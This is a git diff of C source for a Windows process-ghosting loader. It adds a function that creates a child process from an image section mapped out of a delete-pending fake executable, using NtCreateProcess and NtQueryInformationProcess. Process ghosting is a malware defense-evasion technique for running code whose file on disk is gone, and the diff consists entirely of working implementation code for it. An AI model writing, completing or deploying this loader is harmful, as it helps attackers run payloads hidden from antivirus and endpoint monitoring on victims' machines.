@@ -7,6 +7,7 @@
 #include "ghosted.h"
 
 #pragma comment(lib, "ntdll")
+
 // Store child process info
 typedef struct _CP_INFO {
     HANDLE p_handle;
@@ -252,18 +253,62 @@ HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
 }
 
 // Create Child process, gquey it and return a handle 
-CP_INFO create_cp() {
-	CP_INFO p_info;
-	RtlZeroMemory(&p_info, sizeof(CP_INFO));
+PCP_INFO create_cp(HANDLE hsection) {
+	NTSTATUS _status;
+	DWORD retlen = 0;
+	CP_INFO * p_info = (PCP_INFO)malloc(sizeof(CP_INFO));
+
+	if (p_info == NULL) {
+		fprintf(stderr, "[!] Malloc() failed\n");
+		return NULL;
+	}
+
+	RtlZeroMemory(p_info, sizeof(CP_INFO));
+
+	_status = NtCreateProcess(
+		&(p_info->p_handle),
+		PROCESS_ALL_ACCESS, 
+		NULL, 
+		GetCurrentProcess(), 
+		TRUE, 
+		hsection, 
+		NULL, 
+		NULL);
+
+	if (!NT_SUCCESS(_status)) {
+		fprintf(stderr, "[!] NtCreateProcess() failed (0x%x)\n", _status);
+		return NULL;
+	}
+
+	if (p_info->p_handle == NULL || p_info->p_handle == INVALID_HANDLE_VALUE) {
+		fprintf(stderr, "[!] Invalid Handle returned by NtCreateProcess()\n");
+		return NULL;
+	}
+
+	_status = NtQueryInformationProcess(
+		p_info->p_handle, 
+		ProcessBasicInformation, 
+		&(p_info->pb_info),
+		sizeof(PROCESS_BASIC_INFORMATION), 
+		NULL);
+
+	if (!NT_SUCCESS(_status)) {
+		fprintf(stderr, "[!] NtQueryInformationProcess() failed (0x%x)\n", _status);
+		CloseHandle(p_info->p_handle);
+		return NULL;
+	}
+
+	printf("> Process ID: %d\n", GetProcessId(p_info->p_handle));
 	return p_info;
 }
 
 // Spawn a process using ghosting
 int spawn_process(char* real_exe, char* fake_exe) {
 	DWORD f_size;
-	HANDLE hfakefile, hsection, hprocess;
+	HANDLE hfakefile, hsection;
 	LPVOID base_addr;
 	DWORD entry_point_addr;
+	PCP_INFO p_info;
 
 	// Create fake executable and put it in delete-pending state
 	hfakefile = prepare_target(fake_exe);
@@ -303,13 +348,16 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		return -5;
 	}
 
-	printf("> Entry Point: 0x%x\n", entry_point);
+	printf("> Entry Point: 0x%08x\n", entry_point);
 
 	printf("===== Creating Child Process =====\n");
-	hprocess = NULL;
+	p_info = create_cp(hsection);
+	if (p_info == NULL) {
+		CloseHandle(hsection);
+		return -6;
+	}
 
-
-	// CloseHandle(hsection);
+	CloseHandle(p_info->p_handle);
 	CloseHandle(hsection);
 	return 0;
 }
